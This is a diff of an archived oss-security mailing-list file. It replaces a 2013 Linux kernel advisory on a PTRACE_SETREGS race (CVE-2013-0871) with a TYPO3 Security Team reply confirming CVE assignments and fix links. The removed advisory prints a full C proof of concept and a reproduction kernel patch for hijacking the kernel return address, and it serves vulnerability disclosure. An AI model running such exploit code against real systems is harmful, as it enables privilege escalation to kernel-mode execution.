@@ -1,223 +1,103 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/15/16
-Message-ID: <CA+8ESAwKtHMwz3QgCN9GXiwJY7jxsoXfV+o9kxvaK=k0gXT3GA@mail.gmail.com>
-Date: Fri, 15 Feb 2013 12:24:18 -0800
-From: Julien Tinnes <julien@....org>
-To: oss-security@...ts.openwall.com
-Subject: Linux kernel race condition with PTRACE_SETREGS (CVE-2013-0871)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/06/16/1
+Message-ID: <1371383165.202789.564052523.2922.14@securityteam.typo3.org>
+Date: Sun, 16 Jun 2013 13:46:05 +0200
+From: TYPO3 Security Team <security@...o3.org>
+To: Kurt Seifried <kseifried@...hat.com>
+CC: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Re: [Ticket#2012111110000015] TYPO3-CORE-SA-2012-005: Several Vulnerabilities in TYPO3 Core
 Content-Type: text/plain; charset=utf-8
 
-Linux kernel stack corruption due to race condition with PTRACE_SETREGS
------------------------------------------------------------------------
+Dear Kurt Seifried,
 
-A race conditon in ptrace can lead to kernel stack corruption and arbitrary
-kernel-mode code execution.
+Thank you for your request.
 
-This should be tracked as CVE-2013-0871.
+I'm a bit embarrassed about our response time :(
 
-Solution
-------------
+Very sorry for that. Things will vastly improve in the near future!
 
-The following commits from Oleg Nesterov should address the issue:
+12/10/2012 22:40 - Kurt Seifried wrote:
 
-- 910ffdb18a6408e14febbb6e4b6840fd2c928c82
-- 9899d11f654474d2d54ea52ceaa2a1f4db3abd68
-- 9067ac85d533651b98c2ff903182a20cbb361fcb
+> Can the Typo3 security team please confirm the following:
+> 
+> > Component Type: TYPO3 Core Affected Versions: 4.5.0 up to 4.5.20,
+> > 4.6.0 up to 4.6.13, 4.7.0 up
+> to 4.7.5 and development releases of the 6.0 branch.
+> > Vulnerability Types: SQL Injection, Cross-Site Scripting,
+> Information Disclosure
+> 
+> so no CVE's needed for this, this is simply a summary of the below issues?
 
-Credit
----------
+True!
 
-This was discovered by Suleiman Souhlal and Salman Qazi of Google, with help
-from Aaron Durbin and Michael Davidson, also of Google.
+> > Vulnerable subcomponent: TYPO3 Backend History Module Vulnerability
+> > Type: SQL Injection, Cross-Site Scripting Solution: Update to the
+> > TYPO3 version 4.5.21, 4.6.14 or 4.7.6 that
+> fix the problem described!
+> > Credits: Credits go to Thomas Worm who discovered and reported the
+> issue.
+> 
+> Did he discover both the SQL Injection and the Cross-Site Scripting
+> issues? 
 
-Code
---------
+No, he only discovered the XSS. We discovered the SQLi while fixing the XSS.
 
-Salman Qazi provided the following PoC code:
+> Can you provide a link to the specific code fixes?
 
-Kernel patch for easy reproduction:
+Here it is.
+https://review.typo3.org/16304
 
-diff --git a/arch/x86/kernel/ptrace.c b/arch/x86/kernel/ptrace.c
-index b629bbe..e22617e 100644
---- a/arch/x86/kernel/ptrace.c
-+++ b/arch/x86/kernel/ptrace.c
-@@ -24,6 +24,7 @@
- #include <linux/rcupdate.h>
- #include <linux/module.h>
- #include <linux/context_tracking.h>
-+#include <linux/delay.h>
+> so 2 cve's needed correct?
 
- #include <asm/uaccess.h>
- #include <asm/pgtable.h>
-@@ -902,6 +903,12 @@ long arch_ptrace(struct task_struct *child, long request,
-                                           datap);
+Yes.
 
-        case PTRACE_SETREGS:    /* Set all gp regs in the child. */
-+               if (!strcmp(current->comm, "ptrace_death")) {
-+                       int i;
-+                       WARN_ON_ONCE(1);
-+                       for (i = 0 ; i < 15; i++)
-+                               mdelay(10);
-+               }
-                return copy_regset_from_user(child,
-                                             task_user_regset_view(current),
-                                             REGSET_GENERAL,
+> > Vulnerable subcomponent: TYPO3 Backend History Module Vulnerability
+> > Type: Information Disclosure
+> Solution: Update to the TYPO3 version 4.5.21, 4.6.14 or 4.7.6 that fix
+> the problem described!
+> > Credits: Credits go to Core Team Member Oliver Hader who
+> > discovered
+> and fixed the issue.
+> 
+> so one cve needed here? Can you provide a link to the specific code fixes?
 
-source code for ptrace_death:
+Yes.
 
+It's also fixed in the same change:
+https://review.typo3.org/16304
 
-/*
- * Repro case for SETREGS arbitrary ring zero execution bug.
- *
- * The specific scenario that we attempt to create:
- *
- * V does a syscall.  It is being traced by P.  P
- * upon stopping V with PTRACE_SYSCALL and waiting for it, proceeds
- * to read its registers.  At this time P is asleep and an RT process S
- * starts running.
- *
- * Then P proceeds to write V's registers, at shortly it has done this
- * another process K kills V.  Process S goes to sleep permitting V
- * space to run.  V wakes up from its waiting state and heads for the exit.
- *  But, S quickly wakes up again by the time V has reached schedule().  V
- * is no longer running (since S has the CPU)
- *  and P modifies its regs.  When V finally starts running
- * and returns from schedule(), it pops an incorrect value from the
- * stack.  The reason is that the stack on which schedule() is called
- * does not have the final 6 registers in pt_regs on it.  That means that
- * when P modifies V's registers, it is actually overwriting the stack
- * frame saved for schedule(), including the return RIP.
- *
- * V and S and pinned to CPU 0.  S is an RT task so that it can control
- * when V does and doesn't run.
- * remaining processes are not allowed on 0.
- *
- */
+> > Vulnerable subcomponent: TYPO3 Backend API Vulnerability Type:
+> > Cross-Site Scripting Solution: Update to the TYPO3 version 4.5.21,
+> > 4.6.14 or 4.7.6 that
+> fix the problem described!
+> > Credits: Credits go to Johannes Feustel who discovered and
+> > reported
+> the issue.
+> 
+> so one cve needed here? Can you provide a link to the specific code fixes?
+
+Yes: https://review.typo3.org/16305
+
+> > Vulnerability Type: Cross-Site Scripting Solution: Update to the
+> > TYPO3 version 4.5.21, 4.6.14 or 4.7.6 that
+> fix the problem described!
+> > Credits: Credits go to Richard Brain who discovered and reported
+> > the
+> issue.
+> 
+> so one cve needed here? Can you provide a link to the specific code fixes?
+
+Yes: https://review.typo3.org/16300
 
 
-#include <sched.h>
-#include <sys/ptrace.h>
-#include <sys/user.h>
-#include <stdlib.h>
-#include <stdio.h>
-#include <assert.h>
-#include <signal.h>
+Regards,
 
-/* S */
-int nuke_cpu(void)
-{
-        int pid0;
-        int i;
-        unsigned long mask = 1;
+Helmut Hummel
+Member of the TYPO3 Security Team
 
-        pid0 = fork();
-        if (!pid0) {
-                struct sched_param p = {};
-                p.sched_priority = sched_get_priority_min(SCHED_FIFO);
-                assert(!sched_setscheduler(0, SCHED_FIFO, &p));
-                assert(!sched_setaffinity(0, sizeof(mask), &mask));
-                i = 0;
-                usleep(120000);
-                while(1) {
-                        if (i == 50000) {
-                                usleep(10);
-                                printf("x");
-                                fflush(stdout);
-                        }
-                        i++;
-                }
-        }
+--
+TYPO3 Security Team homepage: http://typo3.org/teams/security/
 
-        return pid0;
+E-Mail: security@...o3.org
 
-}
-
-
-int once()
-{
-        long i;
-        int pid0;
-        int pid;
-        unsigned long mask = 1;
-        struct user_regs_struct regs;
-        assert(!sched_setaffinity(0, sizeof(mask), &mask));
-
-        pid = fork();
-
-        if (!pid) {
-                /* V */
-                while (1) {
-                        /* Put our chosen RIP in callee saved registers */
-                        asm __volatile__ (
-                                "mov $0x1eadbeef, %%rbx\n"
-                                "mov $0x1eadbeef, %%rbp\n"
-                                "mov $0x1eadbeef, %%r12\n"
-                                "mov $0x1eadbeef, %%r13\n"
-                                "mov $0x1eadbeef, %%r14\n"
-                                "mov $0x1eadbeef, %%r15\n"
-                                "mov $0, %%rsi\n"
-                                "mov $0, %%rdi\n"
-                                "mov $0x6d, %%rax\n"
-                                "syscall":::"rax","rsi","rdi",
-                                                "r12", "rbx");
-
-                }
-        } else {
-                /* P */
-                assert(!ptrace(PTRACE_ATTACH, pid, 0, 0));
-                wait(NULL);
-                assert(!ptrace(PTRACE_SETOPTIONS, pid, NULL,
-                        PTRACE_O_TRACESYSGOOD |
-                        PTRACE_O_TRACEFORK |
-                        PTRACE_O_TRACEVFORK |
-                        PTRACE_O_TRACECLONE));
-                while(1) {
-                        int nuke_pid;
-                        int pid2;
-                        mask = 0xfffe;
-                        assert(!sched_setaffinity(0, sizeof(mask), &mask));
-                        /*Entry */
-                        assert(!ptrace(PTRACE_SYSCALL, pid, NULL, 0, 0));
-                        wait(NULL);
-                        assert(!ptrace(PTRACE_GETREGS, pid, NULL, &regs));
-
-                        nuke_pid = nuke_cpu();
-
-                        regs.orig_rax = 0x3c;
-
-                        pid2 = fork();
-                        if (!pid2) {
-                                /* K */
-                                usleep(120000);
-                                kill(pid, SIGKILL);
-                                printf(".");
-                                fflush(stdout);
-                                exit(0);
-                        }
-                        printf("{");
-                        fflush(stdout);
-                        if (!ptrace(PTRACE_SETREGS, pid, NULL, &regs)) {
-                                printf("+");
-                        } else {
-                                printf("-");
-                        }
-
-                        ptrace(PTRACE_CONT, pid, NULL, 0, SIGKILL);
-                        kill(pid, SIGKILL);
-                        kill(pid2, SIGKILL);
-                        kill(nuke_pid, SIGKILL);
-                        exit(0);
-                }
-        }
-}
-
-int main(void) {
-
-        while (1) {
-                int pid = fork();
-                if (!pid) {
-                        once();
-                }
-                wait(NULL);
-        }
-}
+Please note: When replying to this e-mail, please leave the header intact.
